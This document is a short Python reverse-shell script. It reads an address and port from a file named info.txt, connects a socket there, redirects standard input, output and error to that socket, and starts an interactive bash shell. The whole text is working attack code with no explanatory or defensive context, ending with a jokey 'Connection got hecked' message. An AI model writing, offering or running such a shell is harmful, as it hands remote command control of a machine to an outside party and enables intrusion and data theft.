import socket,subprocess,os

dat = None

with open("info.txt") as f:
    raw = f.read()
    bits = raw.split(",")
    print("Connecting to " + bits[0] + " on port " + bits[1])
    dat = bits[0],int(bits[1])

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(dat)
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"])
print("Connection got hecked")